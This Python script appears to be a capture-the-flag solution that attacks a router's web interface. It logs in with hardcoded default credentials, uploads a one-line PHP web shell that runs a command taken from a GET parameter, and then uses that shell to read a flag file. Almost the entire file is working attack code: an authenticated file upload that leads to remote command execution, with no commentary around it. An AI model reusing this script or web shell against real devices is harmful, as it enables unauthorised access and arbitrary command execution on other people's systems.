import requests
import sys 

IP, PORT = sys.argv[1], sys.argv[2]
URL = f"http://{IP}:{PORT}/"

username = "admin"
password = "router@123"

#TODO: Add your exploit code here

def login():
    # Login to the router
    login_url = URL + "login.php"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(login_url, data=data)

def file_uperload():
    # File upload
    upload_url = URL + "upload.php"
    data = {
        'files': ('script.php', '<?php system($_GET["cmd"]); ?>')
    }
    response = requests.post(upload_url, files=data)

def exploit():
    # Exploit
    exploit_url = URL + "uploads/script.php?cmd=cat%20/flag"
    response = requests.get(exploit_url)
    print(f"FLAG!{response.text}!")

login()
file_uperload()
exploit()